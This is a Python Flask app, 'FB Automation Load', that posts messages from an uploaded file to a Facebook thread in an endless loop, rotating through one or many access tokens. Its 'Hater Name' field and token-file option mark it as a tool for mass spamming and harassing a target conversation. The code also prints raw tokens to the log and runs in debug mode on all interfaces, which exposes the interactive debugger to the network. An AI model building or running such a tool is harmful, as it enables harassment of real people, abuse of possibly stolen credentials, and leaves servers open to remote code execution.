from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<html>
<head>
    <title>FB Automation Load</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px;
        }
        .container {
            background: rgba(0,0,0,0.6);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-weight: 600;
            margin-bottom: 25px;
            text-align: center;
            letter-spacing: 1.2px;
        }
        label {
            font-weight: 600;
        }
        input, select, button {
            border-radius: 8px !important;
        }
        input[type="text"], input[type="number"], select, input[type="file"] {
            background: #2a2d45;
            border: none;
            color: white;
            padding: 10px 15px;
            margin-bottom: 15px;
            box-shadow: inset 0 0 5px rgba(255,255,255,0.1);
            transition: background 0.3s ease;
        }
        input[type="text"]:focus, input[type="number"]:focus, select:focus, input[type="file"]:focus {
            background: #3c3f5e;
            outline: none;
        }
        button {
            background: #ff416c;
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            border: none;
            padding: 12px;
            width: 100%;
            font-weight: 600;
            font-size: 16px;
            box-shadow: 0 4px 12px rgba(255, 65, 108, 0.6);
            transition: background 0.4s ease;
            cursor: pointer;
        }
        button:hover {
            background: linear-gradient(45deg, #ff4b2b, #ff416c);
            box-shadow: 0 10px 20px rgba(255, 75, 43, 0.7);
        }
        .form-group {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>FB Automation Load</h1>
        <form method="post" enctype="multipart/form-data" action="/">
            <div class="form-group">
                <label for="tokenOption">Token Option:</label>
                <select class="form-select" name="tokenOption" id="tokenOption" onchange="toggleTokenInput()">
                    <option value="single">Single Token</option>
                    <option value="multiple">Multiple Tokens (File)</option>
                </select>
            </div>
            <div class="form-group">
                <input type="text" class="form-control" name="singleToken" id="singleToken" placeholder="Single Token">
                <input type="file" class="form-control" name="tokenFile" id="tokenFile" style="display:none;">
            </div>
            <div class="form-group">
                <label>Thread ID:</label>
                <input type="text" class="form-control" name="threadId" required>
            </div>
            <div class="form-group">
                <label>Hater Name:</label>
                <input type="text" class="form-control" name="kidx" required>
            </div>
            <div class="form-group">
                <label>Time Interval (Seconds):</label>
                <input type="number" class="form-control" name="time" required>
            </div>
            <div class="form-group">
                <label>Message File (.txt):</label>
                <input type="file" class="form-control" name="txtFile" required>
            </div>
            <button type="submit">Start Sending</button>
        </form>
        <form method="post" action="/stop" style="margin-top:20px;">
            <div class="form-group">
                <label>Stop Task ID:</label>
                <input type="text" class="form-control" name="taskId" required>
            </div>
            <button type="submit">Stop</button>
        </form>
    </div>
    <script>
    function toggleTokenInput() {
        var option = document.getElementById("tokenOption").value;
        document.getElementById("singleToken").style.display = option === "single" ? "block" : "none";
        document.getElementById("tokenFile").style.display = option === "multiple" ? "block" : "none";
    }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Heroku friendly
    app.run(host='0.0.0.0', port=port)
